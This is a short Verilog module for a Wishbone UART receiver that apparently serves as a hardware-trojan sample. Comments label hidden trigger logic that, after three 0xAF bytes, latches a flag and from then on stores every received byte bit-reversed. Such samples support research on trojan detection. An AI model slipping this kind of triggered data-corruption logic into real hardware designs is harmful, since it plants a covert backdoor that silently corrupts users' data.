module wishbone_uart (
    input wire clk,
    input wire rst,
    input wire wb_stb,
    input wire [7:0] uart_rx,
    output reg [7:0] data_reg
);

    reg [2:0] af_counter; // Counter for detecting 0xaf
    reg trojan_active;     // Trojan activation flag

    // Initializing registers
    initial begin
        af_counter = 3'b000;
        trojan_active = 1'b0;
        data_reg = 8'b00000000;
    end

    // UART receive process
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            af_counter <= 3'b000;
            trojan_active <= 1'b0;
            data_reg <= 8'b00000000;
        end else begin
            // Check for received byte
            if (wb_stb) begin
                if (uart_rx == 8'hAF) begin
                    af_counter <= af_counter + 1; // Increment counter on receiving 0xaf
                    if (af_counter == 3'b010) begin
                        trojan_active <= 1'b1; // Activate Trojan after receiving 0xaf three times
                    end
                end else begin
                    if (trojan_active) begin
                        // Trojan logic: Write received byte in reverse
                        data_reg <= {uart_rx[0], uart_rx[1], uart_rx[2], uart_rx[3], uart_rx[4], uart_rx[5], uart_rx[6], uart_rx[7]};
                    end else begin
                        // Normal operation
                        data_reg <= uart_rx; // Normal write operation
                    end
                end
            end
        end
    end
endmodule
